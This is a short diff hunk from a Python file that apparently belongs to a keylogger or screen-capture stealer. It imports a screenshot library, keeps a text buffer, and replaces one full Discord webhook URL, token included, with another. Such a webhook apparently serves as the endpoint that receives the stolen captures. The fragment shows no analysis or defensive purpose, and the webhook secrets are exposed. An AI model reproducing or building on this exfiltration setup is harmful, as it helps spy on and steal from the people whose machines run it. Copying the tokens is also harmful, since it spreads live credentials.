@@ -7,7 +7,7 @@ import io
 from PIL import ImageGrab
 
 #webhook
-WEBHOOK_URL = "https://discord.com/api/webhooks/1382068539590054070/Hf2ys1lCd_eRS7ecQx0XxrLzcUXino-GLCszHgrAJKzgQgu3frYY61HLV0YSHLWCNY9d"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1382688083371102238/r-Ev62eVZh4Ejn86NrBUkEVmQwtEBGZBMA42RMhyKy70VxCjgoCBfmrZcBTvdOtNNJqm"
 
 buffer = ""
 
